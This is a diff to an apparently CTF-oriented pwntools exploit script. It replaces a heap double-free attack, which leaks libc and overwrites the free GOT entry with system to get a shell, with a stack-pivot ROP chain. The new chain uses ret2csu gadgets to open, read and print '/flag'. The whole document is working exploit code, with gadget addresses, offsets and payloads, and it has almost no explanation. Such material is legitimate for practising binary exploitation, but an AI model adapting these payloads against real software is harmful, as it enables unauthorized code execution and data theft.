@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './Roc826'
+local_file  = './ROP'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc-2.23.so'
+remote_libc = local_libc # '../libc.so.6'
 
 is_local = False
 is_remote = False
@@ -44,45 +44,46 @@ info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
 def debug(cmd=''):
     if is_local: gdb.attach(p,cmd)
 
-def add(size,cont='aaaa'):
-    sla(':','1')
-    sla('size?\n',str(size))
-    sla('content:',cont)
-
-def delete(index):
-    sla(':','2')
-    sla('index?\n',str(index))
-
-def show(index):
-    sla(':','3')
-    sla('index?\n',str(index))
-    ru('content:')
-    return ru('-----------------')
-
 # info
 # gadget
+prdi = 0x0000000000400a43 # pop rdi ; ret
+leave = 0x000000000040090d # leave ; ret
+m3c = 0x00400a20
+p6r = 0x00400a3a
+prsi = 0x0000000000400a41 # pop rsi ; pop r15 ; ret
+prbp = 0x0000000000400830 # pop rbp ; ret
+
 # elf, libc
-add(0x80)
-add(0x58)
-add(0x58)
-add(0x58,'/bin/sh\x00')
+buf = 0x6010a0
+open_func = 0x400985
+read_plt = elf.symbols['read']
+main = elf.symbols['main']
+open_plt = elf.symbols['open']
+puts_plt = elf.symbols['puts']
+bss_base = elf.bss() + 0x200
 
-delete(0)
-data = show(0)[:-1].ljust(8,'\0')
-log.hexdump(data)
-libcbase = u64(data) - libc.sym['__malloc_hook'] - 0x68
-info_addr('libcbase',libcbase)
+# rop1
+offset = 80
+payload = '\0'*offset
+payload += p64(buf)
+payload += p64(leave)
 
-delete(1)
-delete(2)
-delete(1)
-debug()
-add(0x58,p64(0x601ffa)) # got[free]-14-16
-add(0x58)
-add(0x58)
-add(0x58,'aaaaaaaaaaaaaa'+p64(libcbase+libc.sym['system'])[:6])
+# open('/flag',0,0x100)
+stack = p64(p6r) + p64(0) + p64(1) + p64(buf+0x8*9) + p64(0x100) + p64(0) + p64(buf+0x8*18) + p64(m3c) + p64(open_plt)
+# read(4,bss_base,0x100)
+stack += p64(0) + p64(1) + p64(buf+0x8*17) + p64(0x100) + p64(bss_base) + p64(0x4) + p64(m3c) + p64(read_plt)
+# padding
+stack += '/flag\0\0\0'
+stack += p64(0xdeadbeef)*5
+# pust(bss_base)
+stack += p64(prdi) + p64(bss_base) + p64(puts_plt) + p64(0xdeadbeef) 
 
-delete(3)
+ru('think so?')
+sl('TaQini!!'+stack)
+rc()
+# debug()
+sl(payload)
+# sleep(3)
+sl('TaQini is here~~~')
 
 p.interactive()
-
